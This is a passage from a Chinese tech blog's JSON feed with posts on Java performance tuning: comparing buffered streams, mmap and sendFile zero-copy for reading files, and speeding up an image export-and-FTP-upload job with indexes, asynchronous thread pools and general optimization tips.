class=\"line\">    try (FileChannel channel = new RandomAccessFile(file, &quot;r&quot;).getChannel()) &#123;</span><br><span class=\"line\">        long size = channel.size();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 创建一个与文件大小相同的字节数组</span><br><span class=\"line\">        ByteBuffer buffer = ByteBuffer.allocate((int) size);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 将通道上的所有数据都读入到buffer中</span><br><span class=\"line\">        while (channel.read(buffer) != -1) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 切换为只读模式</span><br><span class=\"line\">        buffer.flip();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 从buffer中获取数据并处理</span><br><span class=\"line\">        byte[] data = new byte[buffer.remaining()];</span><br><span class=\"line\">        buffer.get(data);</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = new String(data);</span><br><span class=\"line\">    &#125; catch (IOException e) &#123;</span><br><span class=\"line\">        System.out.println(&quot;readFileByMmap异常：&quot; + e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>3、内存映射技术mmap：4次上下文切换+3次拷贝</strong></p>\n<p><strong>mmap是一种内存映射技术，mmap相比于传统的缓冲流来说，其实就是少了1次CPU 拷贝，变成了数据共享。</strong></p>\n<p>虽然减少了一次拷贝，但是上下文切换的次数还是没变。</p>\n<p>因为存在一次CPU拷贝，因此mmap并不是严格意义上的零拷贝。</p>\n<p>RocketMQ 中就是使用的 mmap 来提升磁盘文件的读写性能。<br><img src=\"/img/2024/20240511.webp\" alt=\"erik.xyz\"></p>\n<h4 id=\"七、sendFile零拷贝\"><a href=\"#七、sendFile零拷贝\" class=\"headerlink\" title=\"七、sendFile零拷贝\"></a>七、sendFile零拷贝</h4><p>零拷贝将上下文切换和拷贝的次数压缩到了极致。</p>\n<p><strong>1、传统IO流</strong></p>\n<p>1.将磁盘中的文件拷贝到内核空间内存；</p>\n<p>2.将内核空间的内容拷贝到用户空间内存；</p>\n<p>3.用户空间将内容写入到内核空间内存；</p>\n<p>4.socket读取内核空间内存，将内容发送给第三方服务器。<br><img src=\"/img/2024/20240512.webp\" alt=\"erik.xyz\"></p>\n<p><strong>2、sendFile零拷贝</strong></p>\n<p>在内核的支持下，零拷贝少了一个步骤，那就是内核缓存向用户空间的拷贝，这样既节省了内存，也节省了 CPU 的调度时间，让效率更高。<br><img src=\"/img/2024/20240513.webp\" alt=\"erik.xyz\"></p>\n<p><strong>3、sendFile零拷贝：2 次上下文切换 + 2次拷贝</strong></p>\n<p><strong>直接将用户缓冲区干掉，而且没有CPU拷贝，故得名零拷贝。</strong><br><img src=\"/img/2024/20240514.webp\" alt=\"erik.xyz\"></p>\n<p><strong>重置优化4：通过零拷贝读取文件</strong><br><img src=\"/img/2024/20240515.webp\" alt=\"erik.xyz\"></p>\n<h4 id=\"八、总结经过\"><a href=\"#八、总结经过\" class=\"headerlink\" title=\"八、总结经过\"></a>八、总结经过</h4><p><strong>4次优化，将页面的加载时间控制在了1秒以内，实打实的提升了程序的秒开率。</strong></p>\n<p>1.批量查询时，不查询BLOB大字段；</p>\n<p>2.点击运费查询时，单独查询+触发索引，实现“懒加载”；</p>\n<p>3.异步存储文件</p>\n<p>4.通过缓冲流-&gt;内存映射技术mmap-&gt; sendFile零拷贝读取本地文件；</p>\n<p><strong>通过一次页面优化，收获颇丰：</strong></p>\n<p>1.通过业务优化，将BLOB大字段进行“懒加载”；</p>\n<p>2.异步存储文件；</p>\n<p>3.系统的学习了Java IO流，输入输出流、字符流、字符流、转换流；</p>\n<p>4.通过NIO的FileChannel读取文件时，较于缓冲流性能上显著提升；</p>\n<p>5.内存映射技术mmap 相比于传统的 缓冲流 来说，其实就是少了1次内核缓冲区到用户缓冲区的CPU拷贝，将其变成了数据共享；</p>\n<p>6.sendFile零拷贝，舍弃了用户空间内存，舍弃了CUP拷贝，完美的零拷贝方案。</p>\n<p>7.通过代码实例，横向对比了FileReader、BufferedReader、NIO之FileChannel、内存映射技术mmap、sendFile零拷贝之间的性能差距；</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/kaogMK5qz5vkfs9-BYu0Mg\">哪吒编程</a></p>\n",
            "tags": [
                "web",
                "web前端",
                "web优化"
            ]
        },
        {
            "id": "https://erik.xyz/2024/05/06/index-asynchrony-landing/",
            "url": "https://erik.xyz/2024/05/06/index-asynchrony-landing/",
            "title": "增加索引 + 异步 + 不落地后，从 12h 优化到 15 min",
            "date_published": "2024-05-06T03:44:00.000Z",
            "content_html": "<p>在开发中，我们经常会遇到这样的需求，将数据库中的图片导出到本地，再传给别人。</p>\n<h4 id=\"一、一般我会这样做：\"><a href=\"#一、一般我会这样做：\" class=\"headerlink\" title=\"一、一般我会这样做：\"></a>一、一般我会这样做：</h4><p>1.通过接口或者定时任务的形式</p>\n<p>2.读取Oracle或者MySQL数据库</p>\n<p>3.通过FileOutputStream将Base64解密后的byte[]存储到本地</p>\n<p>4.遍历本地文件夹，将图片通过FTP上传到第三方服务器<br><span id=\"more\"></span><br><img src=\"/img/2024/202405100.webp\" alt=\"erik.xyz\"></p>\n<p>现场炸锅了！</p>\n<p>实际的数据量非常大，据统计差不多有400G的图片需要导出。</p>\n<p><strong>现场人员的反馈是，已经跑了12个小时了，还在继续，不知道啥时候能导完。</strong></p>\n<p>停下来呢？之前的白导了，不停呢？不知道要等到啥时候才能导完。</p>\n<p>这不行啊，速度太慢了，一个简单的任务，不能被这东西耗死吧？<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Value(&quot;$&#123;months&#125;&quot;)</span><br><span class=\"line\">private String months;</span><br><span class=\"line\"></span><br><span class=\"line\">@Value(&quot;$&#123;imgDir&#125;&quot;)</span><br><span class=\"line\">private String imgDir;</span><br><span class=\"line\"></span><br><span class=\"line\">@Resource</span><br><span class=\"line\">private UserDao userDao;</span><br><span class=\"line\"></span><br><span class=\"line\">@Override</span><br><span class=\"line\">public void getUserInfoImg() &#123;</span><br><span class=\"line\"> try &#123;</span><br><span class=\"line\">  // 获取需要导出的月表</span><br><span class=\"line\">  String[] monthArr = months.split(&quot;,&quot;);</span><br><span class=\"line\">  for (int i = 0; i &lt; monthArr.length; i++) &#123;</span><br><span class=\"line\">   // 获取月表中的图片</span><br><span class=\"line\">   Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">   String tableName = &quot;USER_INFO_&quot; + monthArr[i];</span><br><span class=\"line\">   map.put(&quot;tableName&quot;, tableName);</span><br><span class=\"line\">   map.put(&quot;status&quot;, 1);</span><br><span class=\"line\">   </span><br><span class=\"line\">   List&lt;UserInfo&gt; userInfoList = userDao.getUserInfoImg(map);</span><br><span class=\"line\">   if (userInfoList == null || userInfoList.size() == 0) &#123;</span><br><span class=\"line\">    return;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   for (int j = 0; j &lt; userInfoList.size(); j++) &#123;</span><br><span class=\"line\">    UserInfo user = userInfoList.get(j);</span><br><span class=\"line\">    String userId = user.getUserId();</span><br><span class=\"line\">    String userName = user.getUserName();</span><br><span class=\"line\">    byte[] content = user.getImgContent;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 下载图片到本地</span><br><span class=\"line\">    FileUtil.dowmloadImage(imgDir + userId+&quot;-&quot;+userName+&quot;.png&quot;, content);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 将下载好的图片，通过FTP上传给第三方</span><br><span class=\"line\">    FileUtil.uploadByFtp(imgDir);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> &#125; catch (Exception e) &#123;</span><br><span class=\"line\">  serviceLogger.error(&quot;获取图片异常：&quot;, e);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"二、谁写的？赶紧加班优化，会追责吗？\"><a href=\"#二、谁写的？赶紧加班优化，会追责吗？\" class=\"headerlink\" title=\"二、谁写的？赶紧加班优化，会追责吗？\"></a>二、谁写的？赶紧加班优化，会追责吗？</h4><p>经过1小时的深思熟虑，慢的原因可能有以下几点：</p>\n<p>1.查询数据库</p>\n<p>2.程序串行</p>\n<p>3.base64解密</p>\n<p>4.图片落地</p>\n<p>5.FTP上传到服务器</p>\n<p>优化1：数据库中添加对应的索引，提高查询速度</p>\n<p>优化2：采用增加索引+异步+多线程的方式进行导出</p>\n<p><img src=\"/img/2024/202405101.webp\" alt=\"erik.xyz\"></p>\n<p>优化3：不解密+图片不落地，直接通过FTP传给第三方</p>\n<p><img src=\"/img/2024/202405102.webp\" alt=\"erik.xyz\"></p>\n<p><strong>使用索引+异步+不解密+不落地 后，40G图片的导出上传，从12+小时 优化到15 分钟，你敢信？</strong></p>\n<p>差不多的代码，效率差距竟如此之大。</p>\n<p>下面贴出导出图片不落地的关键代码。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Resource</span><br><span class=\"line\">private UserAsyncService userAsyncService;</span><br><span class=\"line\"></span><br><span class=\"line\">@Override</span><br><span class=\"line\">public void getUserInfoImg() &#123;</span><br><span class=\"line\"> try &#123;</span><br><span class=\"line\">  // 获取需要导出的月表</span><br><span class=\"line\">  String[] monthArr = months.split(&quot;,&quot;);</span><br><span class=\"line\">  for (int i = 0; i &lt; monthArr.length; i++) &#123;</span><br><span class=\"line\">   userAsyncService.getUserInfoImgAsync(monthArr[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> &#125; catch (Exception e) &#123;</span><br><span class=\"line\">  serviceLogger.error(&quot;获取图片异常：&quot;, e);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Value(&quot;$&#123;months&#125;&quot;)</span><br><span class=\"line\">private String months;</span><br><span class=\"line\"></span><br><span class=\"line\">@Resource</span><br><span class=\"line\">private UserDao userDao;</span><br><span class=\"line\"></span><br><span class=\"line\">@Async(&quot;async-executor&quot;)</span><br><span class=\"line\">@Override</span><br><span class=\"line\">public void getUserInfoImgAsync(String month) &#123;</span><br><span class=\"line\"> try &#123;</span><br><span class=\"line\">  // 获取月表中的图片</span><br><span class=\"line\">  Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">  String tableName = &quot;USER_INFO_&quot; + month;</span><br><span class=\"line\">  map.put(&quot;tableName&quot;, tableName);</span><br><span class=\"line\">  map.put(&quot;status&quot;, 1);</span><br><span class=\"line\">  </span><br><span class=\"line\">  List&lt;UserInfo&gt; userInfoList = userDao.getUserInfoImg(map);</span><br><span class=\"line\">  if (userInfoList == null || userInfoList.size() == 0) &#123;</span><br><span class=\"line\">   return;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  for (int i = 0; i &lt; userInfoList.size(); i++) &#123;</span><br><span class=\"line\">   UserInfo user = userInfoList.get(i);</span><br><span class=\"line\">   String userId = user.getUserId();</span><br><span class=\"line\">   String userName = user.getUserName();</span><br><span class=\"line\">   byte[] content = user.getImgContent;</span><br><span class=\"line\">   </span><br><span class=\"line\">   // 不落地，直接通过FTP上传给第三方</span><br><span class=\"line\">   FileUtil.uploadByFtp(content);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> &#125; catch (Exception e) &#123;</span><br><span class=\"line\">  serviceLogger.error(&quot;获取图片异常：&quot;, e);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>4、异步线程池工具类</strong></p>\n<p><strong>@Async的作用就是异步处理任务。</strong></p>\n<p>1.在方法上添加@Async，表示此方法是异步方法；</p>\n<p>2.在类上添加@Async，表示类中的所有方法都是异步方法；</p>\n<p>3.使用此注解的类，必须是Spring管理的类；</p>\n<p>4.需要在启动类或配置类中加入@EnableAsync注解，@Async才会生效；</p>\n<p>在使用@Async时，如果不指定线程池的名称，也就是不自定义线程池，@Async是有默认线程池的，使用的是Spring默认的线程池SimpleAsyncTaskExecutor。</p>\n<p>默认线程池的默认配置如下：</p>\n<p>1.默认核心线程数：8；</p>\n<p>2.最大线程数：Integet.MAX_VALUE；</p>\n<p>3.队列使用LinkedBlockingQueue；</p>\n<p>4.容量是：Integet.MAX_VALUE；</p>\n<p>5.空闲线程保留时间：60s；</p>\n<p>6.线程池拒绝策略：AbortPolicy；</p>\n<p>从最大线程数可以看出，在并发情况下，会无限制的创建线程，我勒个吗啊。</p>\n<p><strong>也可以通过yml重新配置：</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spring:</span><br><span class=\"line\">  task:</span><br><span class=\"line\">    execution:</span><br><span class=\"line\">      pool:</span><br><span class=\"line\">        max-size: 10</span><br><span class=\"line\">        core-size: 5</span><br><span class=\"line\">        keep-alive: 3s</span><br><span class=\"line\">        queue-capacity: 1000</span><br><span class=\"line\">        thread-name-prefix: my-executor</span><br></pre></td></tr></table></figure></p>\n<p>也可以自定义线程池，下面通过简单的代码来实现以下@Async自定义线程池。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@EnableAsync// 支持异步操作</span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">public class AsyncTaskConfig &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * com.google.guava中的线程池</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Bean(&quot;my-executor&quot;)</span><br><span class=\"line\">    public Executor firstExecutor() &#123;</span><br><span class=\"line\">        ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat(&quot;my-executor&quot;).build();</span><br><span class=\"line\">        // 获取CPU的处理器数量</span><br><span class=\"line\">        int curSystemThreads = Runtime.getRuntime().availableProcessors() * 2;</span><br><span class=\"line\">        ThreadPoolExecutor threadPool = new ThreadPoolExecutor(curSystemThreads, 100,</span><br><span class=\"line\">                200, TimeUnit.SECONDS,</span><br><span class=\"line\">                new LinkedBlockingQueue&lt;&gt;(), threadFactory);</span><br><span class=\"line\">        threadPool.allowsCoreThreadTimeOut();</span><br><span class=\"line\">        return threadPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Spring线程池</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Bean(&quot;async-executor&quot;)</span><br><span class=\"line\">    public Executor asyncExecutor() &#123;</span><br><span class=\"line\">        ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();</span><br><span class=\"line\">        // 核心线程数</span><br><span class=\"line\">        taskExecutor.setCorePoolSize(24);</span><br><span class=\"line\">        // 线程池维护线程的最大数量，只有在缓冲队列满了之后才会申请超过核心线程数的线程</span><br><span class=\"line\">        taskExecutor.setMaxPoolSize(200);</span><br><span class=\"line\">        // 缓存队列</span><br><span class=\"line\">        taskExecutor.setQueueCapacity(50);</span><br><span class=\"line\">        // 空闲时间，当超过了核心线程数之外的线程在空闲时间到达之后会被销毁</span><br><span class=\"line\">        taskExecutor.setKeepAliveSeconds(200);</span><br><span class=\"line\">        // 异步方法内部线程名称</span><br><span class=\"line\">        taskExecutor.setThreadNamePrefix(&quot;async-executor-&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        /**</span><br><span class=\"line\">         * 当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略</span><br><span class=\"line\">         * 通常有以下四种策略：</span><br><span class=\"line\">         * ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。</span><br><span class=\"line\">         * ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。</span><br><span class=\"line\">         * ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）</span><br><span class=\"line\">         * ThreadPoolExecutor.CallerRunsPolicy：重试添加当前的任务，自动重复调用 execute() 方法，直到成功</span><br><span class=\"line\">         */</span><br><span class=\"line\">        taskExecutor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());</span><br><span class=\"line\">        taskExecutor.initialize();</span><br><span class=\"line\">        return taskExecutor;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"三、告别劣质代码，优化从何入手？\"><a href=\"#三、告别劣质代码，优化从何入手？\" class=\"headerlink\" title=\"三、告别劣质代码，优化从何入手？\"></a>三、告别劣质代码，优化从何入手？</h4><p>我觉得优化有两个大方向：</p>\n<p>1.业务优化</p>\n<p>2.代码优化</p>\n<p><strong>1、业务优化业</strong></p>\n<p>务优化的影响力非常大，但它一般属于产品和项目经理的范畴，CRUD程序员很少能接触到。</p>\n<p>比如上面说的图片导出上传需求，经过产品经理和项目经理的不懈努力，这个需求不做了，这优化力度，史无前例啊。</p>\n<p><strong>2、代码优化</strong></p>\n<p>1.数据库优化</p>\n<p>2.复用优化</p>\n<p>3.并行优化</p>\n<p>4.算法优化<br><img src=\"/img/2024/202405103.webp\" alt=\"erik.xyz\"></p>\n<h4 id=\"四、数据库优化\"><a href=\"#四、数据库优化\" class=\"headerlink\" title=\"四、数据库优化\"></a>四、数据库优化</h4><p>1.inner join 、left join、right join，优先使用inner join</p>\n<p>2.表连接不宜太多，索引不宜太多，一般5个以内</p>\n<p>3.复合索引最左特性</p>\n<p>4.操作delete或者update语句，加个limit或者循环分批次删除</p>\n<p>5.使用explain分析你SQL执行计划</p>\n<p>SQL性能优化的47个小技巧，果断收藏！</p>\n<h4 id=\"五、复用优化\"><a href=\"#五、复用优化\" class=\"headerlink\" title=\"五、复用优化\"></a>五、复用优化</h4><p>写代码的时候，大家一般都会将重复性的代码提取出来，写成工具方法，在下次用的时候，就不用重新编码，直接调用就可以了。</p>\n<p>这个就是复用。</p>\n<p>数据库连接池、线程池、长连接也都是复用手段，这些对象的创建和销毁成本过高，复用之后，效率提升显著。</p>\n<p><strong>1、连接池</strong></p>\n<p>连接池是一种常见的优化网络连接复用性的方法。连接池管理着一定数量的网络连接，并且在需要时将这些连接分配给客户端，客户端使用完后将连接归还给连接池。这样可以避免每次通信都建立新的连接，减少了连接的建立和销毁过程，提高了系统的性能和效率。</p>\n<p>在Java开发中，常用的连接池技术有Apache Commons Pool、Druid等。使用连接池时，需要合理设置连接池的大小，并根据实际情况进行调优。连接池的大小过小会导致连接不够用，而过大则会占用过多的系统资源。</p>\n<p><strong>2、长连接</strong></p>\n<p>长连接是另一种优化网络连接复用性的方法。长连接指的是在一次通信后，保持网络连接不关闭，以便后续的通信继续复用该连接。与短连接相比，长连接在一定程度上减少了连接的建立和销毁过程，提高了网络连接的复用性和效率。</p>\n<p>在Java开发中，可以通过使用Socket编程实现长连接。客户端在建立连接后，通过设置Socket的Keep-Alive选项，使得连接保持活跃状态。这样可以避免频繁地建立新的连接，提高网络连接的复用性和效率。</p>\n<p><strong>3、缓存</strong></p>\n<p>缓存也是比较常用的复用，属于数据复用。</p>\n<p>缓存一般是将数据库中的数据缓存到内存或者Redis中，也就是缓存到相对高速的区域，下次查询时，直接访问缓存，就不用查询数据库了，缓存主要针对的是读操作。</p>\n<p><strong>4、缓冲</strong></p>\n<p>缓冲常见于对数据的暂存，然后批量传输或者写入。多使用顺序方式，用来缓解不同设备之间频繁地、缓慢地随机写，缓冲主要针对的是写操作。</p>\n<h4 id=\"六、并行优化\"><a href=\"#六、并行优化\" class=\"headerlink\" title=\"六、并行优化\"></a>六、并行优化</h4><p><strong>1、异步编程</strong></p>\n<p>上面的优化方式就是异步优化，充分利用多核处理器的性能，将串行的程序改为并行，大大提高了程序的执行效率。</p>\n<p>异步编程是一种编程模型，其中任务的执行不会阻塞当前线程的执行。通过将任务提交给其他线程或线程池来处理，当前线程可以继续执行其他操作，而不必等待任务完成。</p>\n<p><strong>2、异步编程的特点</strong></p>\n<p>1.非阻塞：异步任务的执行不会导致调用线程的阻塞，允许线程继续执行其他任务；</p>\n<p>2.回调机制：异步任务通常会注册回调函数，当任务完成时，会调用相应的回调函数进行后续处理；</p>\n<p>3.提高响应性：异步编程能够提高程序的响应性，尤其适用于处理IO密集型任务，如网络请求、数据库查询等；</p>\n<p>Java 8引入了CompletableFuture类，可以方便地进行异步编程。</p>\n<p><strong>3、并行编程</strong></p>\n<p>并行编程是一种利用多个线程或处理器同时执行多个任务的编程模型。它将大任务划分为多个子任务，并发地执行这些子任务，从而加速整体任务的完成时间。</p>\n<p><strong>4、并行编程的特点</strong></p>\n<p>1.分布式任务：并行编程将大任务划分为多个独立的子任务，每个子任务在不同的线程中并行执行；</p>\n<p>2..数据共享：并行编程需要考虑多个线程之间的数据共享和同步问题，以避免出现竞态条件和数据不一致的情况；</p>\n<p>3.提高性能：并行编程能够充分利用多核处理器的计算能力，加速程序的执行速度。</p>\n<p><strong>5、并行编程如何实现？</strong></p>\n<p>1.多线程：Java提供了Thread类和Runnable接口，用于创建和管理多个线程。通过创建多个线程并发执行任务，可以实现并行编程。</p>\n<p>2.线程池：Java的Executor框架提供了线程池的支持，可以方便地管理和调度多个线程。通过线程池，可以复用线程对象，减少线程创建和销毁的开销；</p>\n<p>3.并发集合：Java提供了一系列的并发集合类，如ConcurrentHashMap、ConcurrentLinkedQueue等，用于在并行编程中实现线程安全的数据共享。</p>\n<p>异步编程和并行编程是Java中处理任务并提高程序性能的两种重要方法。</p>\n<p>异步编程通过非阻塞的方式处理任务，提高程序的响应性，并适用于IO密集型任务。</p>\n<p>而并行编程则是通过多个线程或处理器并发执行任务，充分利用计算资源，加速程序的执行速度。</p>\n<p>在Java中，可以使用CompletableFuture和回调接口实现异步编程，使用多线程、线程池和并发集合实现并行编程。通过合理地运用异步和并行编程，我们可以在Java中高效地处理任务和提升程序的性能。</p>\n<p><strong>6、代码示例</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void main(String[] args) &#123;</span><br><span class=\"line\">    // 创建线程池</span><br><span class=\"line\">    ExecutorService executor = Executors.newFixedThreadPool(10);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 使用线程池创建CompletableFuture对象</span><br><span class=\"line\">    CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class=\"line\">        // 一些不为人知的操作</span><br><span class=\"line\">        return &quot;result&quot;; // 返回结果</span><br><span class=\"line\">    &#125;, executor);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 使用CompletableFuture对象执行任务</span><br><span class=\"line\">    CompletableFuture&lt;String&gt; result = future.thenApply(result -&gt; &#123;</span><br><span class=\"line\">        // 一些不为人知的操作</span><br><span class=\"line\">        return &quot;result&quot;; // 返回结果</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 处理任务结果</span><br><span class=\"line\">    String finalResult = result.join();</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 关闭线程池</span><br><span class=\"line\">    executor.shutdown();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>7、Java 8 parallel</strong></p>\n<p><strong>（1）parallel()是什么</strong></p>\n<p>Stream.parallel() 方法是 Java 8 中 Stream API 提供的一种并行处理方式。在处理大量数据或者耗时操作时，使用 Stream.parallel() 方法可以充分利用多核 CPU 的优势，提高程序的性能。</p>\n<p>Stream.parallel() 方法是将串行流转化为并行流的方法。通过该方法可以将大量数据划分为多个子任务交由多个线程并行处理，最终将各个子任务的计算结果合并得到最终结果。使用 Stream.parallel() 可以简化多线程编程，减少开发难度。</p>\n<p>需要注意的是，并行处理可能会引入线程安全等问题，需要根据具体情况进行选择。</p>\n<p><strong>（2）举一个简单的demo</strong></p>\n<p>定义一个list，然后通过parallel() 方法将集合转化为并行流，对每个元素进行i++，最后通过 collect(Collectors.toList()) 方法将结果转化为 List 集合。</p>\n<p>使用并行处理可以充分利用多核 CPU 的优势，加快处理速度。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 